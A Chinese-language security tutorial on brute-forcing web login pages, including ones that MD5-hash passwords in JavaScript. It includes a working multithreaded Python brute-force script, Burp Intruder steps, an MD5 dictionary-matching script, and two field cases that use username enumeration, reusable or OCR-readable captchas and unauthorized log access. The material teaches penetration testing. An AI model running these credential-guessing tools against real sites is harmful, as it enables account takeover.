### 0x01 前言

Web登录界面是网站前台进入后台的通道，针对登录管理界面，常见的web攻击如：SQL注入、XSS、弱口令、暴力猜解等。[]()[海峡信息白帽子id:Bypass本文主要对web暴力猜解的思路做一个简单的分析，并结合漏洞实例进行阐述。]()

### 0x02 思路

在Web登录界面主要有三个要素：用户名、密码、验证码，最简单的思路：

1、获取用户名，常见的有登录错误提示、网站文章编辑落款、社工等

2、猜解密码，一个有效的字典

3、验证码识别或绕过，常见有验证码与用户名密码分离、验证码不能自动刷新可重复使用、验证码识别

按照HTTP传递数据的方式，大致分为两个类型：

类型一：明文传输

没有验证码、没有做登录失败处理的web应用，这个是最喜闻乐见的，只有用户名、密码登录，可以直接加载字典进行爆破，最常见的就是使用利用Burp Suite
Intruder进行暴力猜解，Intruder支持多种爆破模式：单一字典爆破、多字段相同字典爆破、多字典位置对应爆破、聚合式爆破。

类型二：前端js加密处理

现在，不少Web应用在登录过程中会使用js对密码进行加密，然后在发送服务端，使用代理工具抓包获取到的密码就是加密后的密码，在一定程度上给我们爆破增加了些麻烦。以下针对js加密爆破的思路做一个分析。

### 0x03 js加密爆破

常见的js实现加密的方式有：md5、base64、shal，这里编写了一个简单的demo作为测试。

login.html

    
    
    <!DOCTYPE HTML>    
    <html>    
    <head>    
    <meta charset="utf-8">    
    <title>用户登录</title>    
    <script type="text/ecmascript" src="md5.js"></script>  
    <script>  
    function checkInput() {  
        var password_input = document.getElementById('password');  
        var password_md5 = document.getElementById('password_md5');  
        // set password  
        password_md5.value =hex_md5(password_input.value);  
        return true;  
    }  
    </script>  
    </head>   
    <body>    
    <form action="login.php" method="post" onsubmit="return checkInput()">  
        用户：<input type="text" id="username" name="username"> <br/>  
        密码：<input type="password" id="password"> <br/>  
        <input type="hidden" id="password_md5" name="password">  
        <input type="submit" value="提交" />  
    </form>  
    </body>    
    </html>

提交表单，进行抓包，可以发现密码字段密码进行了加密处理：

  
![1.png](https://image.3001.net/images/20180731/1533025617_5b601d51e5c1c.png!small)

常见的js
md5加密，处理方式有两种，其一是利用Intruder支持多种加密和编码，对密码字段进行加密，其二是编写Python脚本，熟悉加密算法的可以自己重写或者直接利用网站的js文件对密码字段进行加密。

#### 3.1 Burp Suite Intruder

1、抓包发送到Intruder，标记相关参数，选择 第四种模式“Cluster bomb”

![2.png](https://image.3001.net/images/20180731/1533025634_5b601d626ce58.png!small)

2、分别选择用户名字典和密码字典，在设置密码字典的时候，选择md5加密方式对密码字段进行加密处理

  
![3.png](https://image.3001.net/images/20180731/1533025651_5b601d73a165a.png!small)

3、开始进行爆破，根据返回字段长度判断是否成功，成功获取用户名和密码字段的MD5值
admin:21232f297a57a5a743894a0e4801fc3

  
![4.png](https://image.3001.net/images/20180731/1533025680_5b601d90f1779.png!small)

4、md5解密成功，获得用户名密码 admin/admin

  
![5.png](https://image.3001.net/images/20180731/1533025695_5b601d9f8ac8c.png!small)

#### 3.2 PyExecJS

这边采用Python ExecJs来执行Js语句模拟前端对账号密码进行加密

准备：

pip install PyExecJS

phantomjs下载：https://bitbucket.org/ariya/phantomjs/downloads/phantomjs-2.1.1-windows.zip

编写Python脚本进行爆破：

    
    
    #! /usr/bin/env python  
    # _*_  coding:utf-8 _*_  
    import requests  
    import threadpool  
    from selenium import webdriver  
    import execjs  
    def getpass(str):  
        with open ('md5.js','r') as js:  
            source = js.read()  
            phantom = execjs.get('PhantomJS')  
            getpass = phantom.compile(source)  
            password = getpass.call('hex_md5',str)  
            return password  
    def login(user,passwd):  
        url="http://127.0.0.1/login.php"  
        payload ={'username':user,'password':getpass(passwd)}  
        headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}  
        try:          
            response = requests.post(url,data=payload,headers=headers,timeout=5)  
            result=response.content  
            if result.count('fail')<1:   
                print '[success] ' +url+":"+user+':'+passwd  
        except:  
            pass  
    def getLines(fileName):  
        list=[]  
        with open(fileName, 'r') as fd:  
            for line in fd.readlines():  
                line = line.strip()  
                if not len(line) or line.startswith('#'):  
                    continue  
                list.append(line)  
        return list  
    if __name__ == '__main__':      
        username_list=getLines('user.dict')  
        password_list=getLines('pass.dict')  
        userlist = [([user,passwd],None) for user in username_list for passwd in password_list]      
        pool = threadpool.ThreadPool(20)    
        reqs = threadpool.makeRequests(login,userlist)    
        [pool.putRequest(req) for req in reqs]    
        pool.wait()  
    

成功爆破用户账号密码

![6.png](https://image.3001.net/images/20180731/1533025717_5b601db52700d.png!small)

### 0x04 漏洞实例

这里分享两个漏洞实例，在实战中，根据不同的漏洞场景，灵活地去运用暴力美学，简单，极具杀伤力。

#### 漏洞实例一：未授权获取用户名+密码js加密+验证码重复利用

漏洞场景：网站首页包含一个登陆模块，包含用户名、密码、验证码，输入正常数据测试，发现密码采用js加密传输，验证码无法自动刷新，可重复使用。

1、扫描网站敏感文件，发现系统存在未授权访问， 通过url可直接访问系统后台日志管理模块，获取用户登录用户名等。

  
![7.png](https://image.3001.net/images/20180731/1533025765_5b601de55323c.png!small)  

2、通过未授权获取到的用户名，加载密码字典，并对字典密码进行编码，暴力破解，成功爆破出用户tb的密码所对应的md5值为：
6846860684f05029abccc09a53cd66f1

  
![8.png](https://image.3001.net/images/20180731/1533025783_5b601df7cf4ee.png!small)

3、md5破解，获得md5所对应的值为：a111111

  
![9.png](https://image.3001.net/images/20180731/1533025801_5b601e09a770b.png!small)

TIPS：有时候遇到md5值解密不出来的时候，怎么办？我们知道，这个md5值所对应的的是我们密码字典里的某一个，可以编写Python脚本进行md5值的比对。

    
    
    Python脚本：  
    !/usr/bin/env python  
    -- coding: utf-8 --  
    import hashlib    
    src='6846860684f05029abccc09a53cd66f1'  
    def get_line():  
        f = open('1.txt') #默认mode=‘r’  
        print 'start:'  
        while True:  
            line = f.readline().strip()  
            if len(line)==0:  
                print 'line 0'  
                break  
            m1 = hashlib.md5()  
            m1.update(line)  
            tmp =m1.hexdigest()  
            print line+"  :"+tmp  
            if tmp==src:  
                print src+u': md5对应的值为：'+line  
                break  
    

测试截图：

![10.png](https://image.3001.net/images/20180731/1533025819_5b601e1b5c700.png!small)

5、通过获取到的用户及破解出来的用户，成功登陆系统。

  
![11.png](https://image.3001.net/images/20180731/1533025844_5b601e34581c6.png!small)

#### 漏洞场景二：登录错误提示+验证码可识别

1、输入用户名admin，密码、验证码，提示您输入的用户名不存在，请重新输入。

  
![12.png](https://image.3001.net/images/20180731/1533025900_5b601e6cb41c0.png!small)

2、利用Pkav HTTP Fuzzer 1.2 的验证码识别引擎，可自动识别出验证码  

![13.png](https://image.3001.net/images/20180731/1533025931_5b601e8bac8ee.png!small)  

3、根据登录错误提示，通过加载用户名字典进行爆破，当提示“您输入的密码不正确，请重新输入”，这个时候我们获得了用户名为sysadmin，进一步加载密码字典进行爆破，对用户密码进行爆破。

  
![14.png](https://image.3001.net/images/20180731/1533025947_5b601e9b6b334.png!small)

![1531467403525.gif](https://image.3001.net/images/20180731/1533025588_5b601d346a4ed.gif!small)
最值得信赖的解决方案专家 海峡信息

